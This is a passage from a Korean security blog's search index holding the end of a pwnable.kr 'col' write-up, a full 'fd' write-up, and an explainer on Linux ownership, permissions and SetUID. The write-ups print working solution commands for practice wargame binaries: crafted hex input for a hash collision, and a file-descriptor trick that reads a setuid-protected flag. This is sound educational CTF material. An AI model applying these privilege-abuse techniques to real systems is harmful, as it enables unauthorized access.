ip 변수에는 4 개의 문자열 이 저장된다.int 형은 4 byte 이고, char 형은 한 문자 당 1 byte 이기 때문에, int 형으로 타입 캐스팅을 하며 문자열 4개가 하나의 integer 형 변수로 취급된다.즉, 만약 사용자가 입력한 값이 abcdefgh 라면, ip 변수는 크기가 2인 배열이 되며, ip[0]에는 abcd를 int 형으로 변환한 값이, ip[1]에는 efgh를 int 형으로 변환한 값이 저장된다.타입을 캐스팅 한 후에는 반복문을 돌며 res 변수에 ip에 저장 된 값을 더해준다.20 byte 의 문자열을 입력 받아 4 byte 씩 나누어 ip에 저장했기 때문에 반복문은 총 5번을 수행하게 된다.반복문 종료 후, res를 반환 해 준다.따라서, flag를 읽기 위해서는 20 byte의 argv[1]의 값을 4 byte 씩 나누어 int 형태로 더한 값이 0x21DD09EC와 같아야 한다.문제를 해결하기 위해 0x21DD09EC를 5로 나누어 보았다.  0x21DD09EC / 5 = 0x6C5CEC80x6C5CEC8 * 5 = 0x21DD09E8따라서 문제를 풀기 위해 입력해야 하는 문자열은 0x6C5CEC8를 4번 반복하고 마지막으로 0x6C5CECC를 이어주면 된다.만약 0x6C5CEC8 나 0x6C5CECC 에 해당하는 문자가 있다면 그대로 써주려 했지만, 해당하는 아스키 코드 문자가 없기 때문에 해당 문자열을 hex 값으로 직접 입력 해 주었다.아래와 같이 문제를 풀 수 있었다.col@ubuntu:~$ ./col `python -c 'print \"\\xc8\\xce\\xc5\\x06\"*4+\"\\xcc\\xce\\xc5\\x06\"'`daddy! I just managed to create a hash collision :)FLAG : daddy! I just managed to create a hash collision :)",
        "url": "//wargame/pwnable.kr/2018/02/17/pwnable.kr-col.html"
      }
      ,
    
      "wargame-pwnable-kr-2018-02-15-pwnable-kr-fd-html": {
        "title": "[Pwnable.kr] Toddler's Bottle - fd 문제풀이",
        "tags": "Write-up, Pwnable.kr",
        "date": "February 15, 2018",
        "author": "",
        "category": "",
        "content": "Pwnable을 공부하기 위해 Pwnable.kr 의 문제를 풀기 시작했다.먼저 첫 단계인 Toddler's Bottle 의 문제를 풀어보았다.문제 접속 정보는 아래와 같다.  ssh fd@pwnable.kr -p2222 (pw:guest)문제에 접속하면 3개의 파일을 확인할 수 있다.  -r-sr-x—  1 fd_pwn fd   7322 Jun 11  2014 fd-rw-r–r–  1 root   root  418 Jun 11  2014 fd.c-r–r—–  1 fd_pwn root   50 Jun 11  2014 flagfd 라는 이름의 실행파일, fd.c 라는 소스코드 파일, flag 파일이 있다.파일의 권한에 대한 설명은 여기를 참조하면 된다.즉, fd 문제에서, 현재 내 계정은 fd 이기 때문에, fd 실행파일은 읽거나 실행시킬 수 있고, fd.c 파일은 읽을 수만 있다.또한 flag 파일에는 아무런 권한을 가지고 있지 않다.따라서, setuid가 걸려 있는 fd 실행 파일을 이용 해, 파일 소유자인 fd_pwn 의 권한을 얻어 flag 파일을 읽어야 한다.fd.c 파일의 내용을 읽어 보면 다음과 같다.#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char buf[32];int main(int argc, char* argv[], char* envp[]){\tif(argc&lt;2){\t\tprintf(\"pass argv[1] a number\\n\");\t\treturn 0;\t}\tint fd = atoi( argv[1] ) - 0x1234;\tint len = 0;\tlen = read(fd, buf, 32);\tif(!strcmp(\"LETMEWIN\\n\", buf)){\t\tprintf(\"good job :)\\n\");\t\tsystem(\"/bin/cat flag\");\t\texit(0);\t}\tprintf(\"learn about Linux file IO\\n\");\treturn 0;}만약 argc가 2개 이하인 경우에는 “pass argv[1] a number”을 출력하고 프로그램을 종료한다.  argc : arguments count. 프로그램 실행 시 main 함수로 전달 된 인자의 갯수  argv : arguments vector. 프로그램 실행 시 main 함수로 전달 된 인자ex) ./fd 1111 : argc는 2, argv[0]은 ./fd, argv[1]은 1111이 후, fd라는 변수를 선언 해 argv[1]의 값을 숫자로 변환한 후 0x1234를 뺀 값을 저장한다.  atoi 함수          함수 원형 : int atoi(const char * str)      문자열을 정수로 변환하는 함수      len 변수를 선언한 후에는 read 함수를 사용 해 미리 선언 해 두었던 buf 라는 전역 변수에 32 byte 만큼 값을 읽어 온다.  read 함수          함수 원형 : read(int fd, void *buf, size_t nbytes)      fd(File Descriptor)가 참조하는 파일의 오프셋에서 nbytes 만큼 읽어 buf에 저장하는 함수        File Discriptor          운영체제에서 파일을 관리하기 위해 각 파일마다 부여한 번호      파일을 열게 되면 번호가 파일에 부여되고 디스크립터 테이블에 저장      0 ~ 2번은 이미 할당되어 있기 때문에 파일에 부여하는 번호는 3번부터 시작                  번호      설명      이름      파일스트림                  0      표준 입력(Standard Input)      STDIN_FILENO      stdin              1      표준 출력(Standard Output)      STDOUT_FILENO      stdout              2      표준 에러(Standard Error)      STDERR_FILENO      stderr      read 함수를 통해 buf에 값을 저장 한 이후에는 해당 값과 LETMEWIN 을 비교한다.만약 그 값이 같을 경우에는 good job :) 을 출력하고 system 함수를 통해 /bin/cat flag 명령어를 실행 해, flag 파일을 읽을 수 있게 된다.즉, 이 문제에서 조작할 수 있는 부분은 fd 변수이다.fd 변수는 read 함수의 File Discriptor로 사용되므로, fd의 값을 0으로 만들어 표준 입력을 받도록 하고, 표준 입력을 통해 LETMEWIN을 입력한다면 buf에 입력 값이 저장되며 strncmp가 있는 조건문을 통과할 수 있을 것이다.fd 변수에는 argv[1]의 값에서 0x1234를 뺀 값이 저장된다.0x1234는 16진수 값 이므로 이를 10진수로 바꾸면 4660이 된다.따라서 fd 파일을 실행하며 인자로 4660을 주면, 변수 fd에는 인자로 받아 온 4660 - 0x1234의 값인 0이 저장된다.이 후, read 함수의 fd 변수 자리에는 0이 되며 표준 입력 값을 받아오게 된다.이를 수행한 결과 다음과 같다.fd@ubuntu:~$ ./fd 4660LETMEWINgood job :)mommy! I think I know what a file descriptor is!!FLAG : mommy! I think I know what a file descriptor is!!",
        "url": "//wargame/pwnable.kr/2018/02/15/pwnable.kr-fd.html"
      }
      ,
    
      "development-basic-2018-02-15-linux-permission-html": {
        "title": "[Linux] 소유권(Ownership) / 허가권(Permission)",
        "tags": "System",
        "date": "February 15, 2018",
        "author": "",
        "category": "",
        "content": "리눅스 운영체제에서는 소유권(Ownership)과 허가권(Permission)을 가지고 있다.리눅스 운영체제를 사용하는데 있어 매우 중요한 개념이기 때문에 정리하려 한다.허가권(Permission)리눅스 운영체제에서 파일과 디렉토리 목록을 보기 위해 ls 명령어를 사용한다.이때, -al 옵션을 주어 전체 목록을 확인 해 보면 아래와 같은 형태를 확인할 수 있다.  -r-sr-x—  1 user guest   7322 Jun 11  2014 file-rw-r–r–  1 root   root  418 Jun 11  2014 code.c-r–r—–  1 user root   50 Jun 11  2014 textFile여기서 앞의 r, w, x 형태로 나타난 부분이 바로 허가권(Permission) 이다.  -rwxrwxr-x : 파일 (맨 앞이 -)  drwxrwxr-x : 디렉토리 (맨 앞이 d)허가권에서 r, w, x 는 각각 read(읽기), write(쓰기), execute(실행, 접근) 을 의미한다.  File Type : 디렉토리와 파일을 구분  User : 소유자의 권한  Group : 소유 그룹의 권한  Others : 소유자나 소유 그룹에 포함되지 않는 사용자의 권한            권한      표시      파일      디렉토리      Octal 값                  읽기      r      파일을 읽고 복사 가능      ls 명령어를 통해 디렉토리의 목록 확인 가능      4              쓰기      w      파일의 내용 수정 가능      디렉토리에 파일을 추가 혹은 삭제 가능      2              실행      x      실행 가능한 파일을 실행 가능      cd 명령어로 디렉토리 접근 가능      1      소유권(Ownableship)아래의 예시에서 파일의 허가권 옆에 user, guest, root 등으로 나타난 부분이 소유권이다.  -r-sr-x---  1 user guest   7322 Jun 11  2014 file-rw-r--r--  1 root   root  418 Jun 11  2014 code.c-r--r-----  1 user root   50 Jun 11  2014 textFile앞 부분이 해당 파일의 소유자이며, 뒷 부분은 소유 그룹이다.  -r-sr-x—  1 user guest   7322 Jun 11  2014 file위에서 user는 file 파일의 소유자이며, guest가 file 파일의 소유 그룹이 된다.SetUID / SetGID그런데 예시를 살펴 보면, 파일의 허가권에 x가 아닌 s가 나타나 있는 부분이 있다.  -r-sr-x—  1 user guest   7322 Jun 11  2014 file바로 SetUID가 설정되어 있는 것이다.  SetUID : 사용자가 사용을 할 때만 소유자의 권한으로 파일을 실행함  SetGID : 사용자가 사용을 할 때만 그룹의 권한으로 파일을 실행함표기는 x 대신 s를 사용위의 예시에서는 앞의 User 의 허가권 부분에 SetUID가 걸려 있다.따라서 file을 실행하는 동안에는 user의 권한으로 파일을 실행하게 된다.만약 파일의 소유자가 root인 파일에 SetUID가 걸려 있다면, 일반 사용자가 해당 파일을 실행하는 동안에는 root의 권한을 사용할 수 있다.",
        "url": "//development/basic/2018/02/15/linux-permission.html"
      }
      
    
  };
</script>

<script src="https://cdnjs.cloudflare.com/ajax/libs/lunr.js/0.7.1/lunr.min.js"></script>
<script src="/assets/js/search.js"></script>
</section>
</article>

    </div>
    
<script src="/assets/js/katex_init.js"></script>



<footer class="site-footer">
	<p class="text">Powered by <a href="https://jekyllrb.com/">Jekyll</a> with <a href="https://github.com/rohanchandra/type-theme">Type Theme</a>
</p>
</footer>


    <script id="dsq-count-scr" src="//.disqus.com/count.js" async></script>

    <!-- Google Analytics Tracking code -->
<script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', '']);
    _gaq.push(['_trackPageview']);
    (function() {
        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
</script>

  </body>
</html>
